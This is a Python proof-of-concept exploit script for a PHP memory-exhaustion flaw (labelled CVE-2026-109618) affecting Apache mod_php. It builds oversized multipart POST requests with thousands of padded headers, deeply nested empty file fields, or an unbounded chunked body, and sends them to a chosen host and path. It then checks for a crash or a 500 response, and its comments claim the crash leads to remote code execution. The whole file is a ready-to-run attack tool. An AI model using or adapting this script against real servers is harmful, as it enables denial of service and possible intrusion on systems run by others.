#!/usr/bin/env python3
"""
CVE-2026-109618 — PHP OOM Corruption → RCE (Apache mod_php)
Zero preconditions: no LFI, no unserialize, no application code needed.

The multipart parser can be forced to OOM while request memory is in an
invalid/uninitialized state. longjmp() skips cleanup, and mod_php's
unconditional request shutdown reads/branches on the invalid memory.

Three OOM strategies (from the official advisory):
1. No Content-Length → bypasses post_max_size → unbounded body data
2. Unlimited headers per multipart part → memory amplification
3. Empty file controls with nested field names → array multiplication

This POC demonstrates strategy #2 (header amplification) and #3 (nested arrays).

Target: Apache mod_php (NOT php-fpm — FPM exits child on startup failure)
Tested: PHP 8.2.34 with Apache mod_php

For authorized security research only.
"""
import argparse
import socket
import sys
import time


def build_header_bomb(boundary, num_headers=5000, header_size=500):
    """Strategy 2: A single multipart part with thousands of headers.
    Each header line uses ~header_size bytes on the wire but PHP's internal
    representation (zend_string + HashTable bucket) uses more memory.
    Memory amplification: ~3-5x wire size."""

    part = f"--{boundary}\r\n"
    part += f'Content-Disposition: form-data; name="f"; filename="a"\r\n'
    for i in range(num_headers):
        # Custom headers — PHP stores them all
        part += f"X-Pad-{i}: {'A' * header_size}\r\n"
    part += "\r\n"  # end of headers
    part += "Z"     # minimal body
    part += f"\r\n--{boundary}--\r\n"
    return part.encode()


def build_nested_array_bomb(boundary, depth=8, width=20):
    """Strategy 3: Empty file controls with deeply nested field names.
    PHP creates nested arrays for names like a[b][c][d][e][f][g][h].
    N fields × depth levels × PHP array overhead = exponential memory use.
    Empty file controls don't count toward max_file_uploads."""

    parts = []
    for i in range(width):
        # Build nested name: f[0][1][2]...[depth]
        name = "f"
        for d in range(depth):
            name += f"[{d}]"
        name += f"[{i}]"

        # Empty file control — no actual file, but PHP still creates metadata
        part = f"--{boundary}\r\n"
        part += f'Content-Disposition: form-data; name="{name}"; filename=""\r\n'
        part += "Content-Type: application/octet-stream\r\n"
        part += "\r\n"  # empty body
        parts.append(part)

    body = "".join(parts) + f"--{boundary}--\r\n"
    return body.encode()


def build_no_content_length_bomb(boundary, chunk_size=8192, total_mb=128):
    """Strategy 1: No Content-Length header → bypasses post_max_size check.
    Send continuous multipart body data exceeding memory_limit."""

    header = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="data"\r\n'
        f"\r\n"
    ).encode()

    # This returns a generator for streaming
    def generate():
        yield header
        total = 0
        target = total_mb * 1024 * 1024
        chunk = b"A" * chunk_size
        while total < target:
            yield chunk
            total += chunk_size
        yield f"\r\n--{boundary}--\r\n".encode()

    return generate


def send_oom_request(host, port, path, strategy="headers", **kwargs):
    """Send the OOM-triggering multipart request."""
    boundary = "OOM_BOUNDARY_" + str(int(time.time()))

    if strategy == "headers":
        body = build_header_bomb(boundary,
                                num_headers=kwargs.get("num_headers", 5000),
                                header_size=kwargs.get("header_size", 500))
        content_length = len(body)

        req = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
            f"Content-Length: {content_length}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode() + body

        s = socket.create_connection((host, port), timeout=30)
        s.sendall(req)

    elif strategy == "nested":
        body = build_nested_array_bomb(boundary,
                                       depth=kwargs.get("depth", 10),
                                       width=kwargs.get("width", 1000))
        content_length = len(body)

        req = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
            f"Content-Length: {content_length}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode() + body

        s = socket.create_connection((host, port), timeout=30)
        s.sendall(req)

    elif strategy == "no_length":
        # No Content-Length — send streaming
        header = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode()

        s = socket.create_connection((host, port), timeout=60)
        s.sendall(header)

        gen = build_no_content_length_bomb(boundary,
                                           total_mb=kwargs.get("total_mb", 128))
        for chunk in gen():
            # Chunked encoding
            s.sendall(f"{len(chunk):x}\r\n".encode() + chunk + b"\r\n")
        s.sendall(b"0\r\n\r\n")

    # Read response
    s.settimeout(15)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    return resp


def main():
    ap = argparse.ArgumentParser(description="CVE-2026-109618 OOM Corruption POC")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=80)
    ap.add_argument("--path", default="/index.php")
    ap.add_argument("--strategy", choices=["headers", "nested", "no_length"], default="headers")
    ap.add_argument("--num-headers", type=int, default=5000)
    ap.add_argument("--header-size", type=int, default=500)
    ap.add_argument("--depth", type=int, default=10)
    ap.add_argument("--width", type=int, default=1000)
    ap.add_argument("--total-mb", type=int, default=128)
    args = ap.parse_args()

    print(f"CVE-2026-109618 — PHP OOM Corruption POC")
    print(f"Target: {args.host}:{args.port}{args.path}")
    print(f"Strategy: {args.strategy}")
    print()

    if args.strategy == "headers":
        print(f"Sending {args.num_headers} headers × {args.header_size} bytes each")
        wire_size = args.num_headers * (args.header_size + 20)
        mem_est = wire_size * 4  # ~4x amplification
        print(f"Wire size: ~{wire_size // 1024 // 1024}MB, Estimated PHP memory: ~{mem_est // 1024 // 1024}MB")
    elif args.strategy == "nested":
        print(f"Sending {args.width} empty file controls with {args.depth}-deep nesting")
    elif args.strategy == "no_length":
        print(f"Sending {args.total_mb}MB without Content-Length (bypasses post_max_size)")

    print()
    print("Sending...")

    resp = send_oom_request(args.host, args.port, args.path,
                            strategy=args.strategy,
                            num_headers=args.num_headers,
                            header_size=args.header_size,
                            depth=args.depth,
                            width=args.width,
                            total_mb=args.total_mb)

    if resp:
        status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace")
        print(f"Response: {status}")
        print(f"Size: {len(resp)} bytes")

        # NOTE: do NOT match b"connection" here — every normal response
        # contains a "Connection: close" header. Check the body instead.
        body = resp.split(b"\r\n\r\n", 1)[-1] if b"\r\n\r\n" in resp else b""
        if b"500" in status.encode() or b"Allowed memory size" in body:
            print("\n[+] Server returned 500 / OOM fatal — OOM likely triggered!")
            print("    On Apache mod_php, the request shutdown procedure runs on invalid state.")
            print("    With heap shaping, this leads to RCE.")
        elif not resp:
            print("\n[+] No response — server process likely crashed!")
        else:
            print("\n[-] Server responded normally — OOM threshold not reached.")
            print("    Try increasing --num-headers or --header-size")
    else:
        print("\n[+] No response — server process likely crashed!")
        print("    This confirms the OOM bailout condition.")


if __name__ == "__main__":
    main()
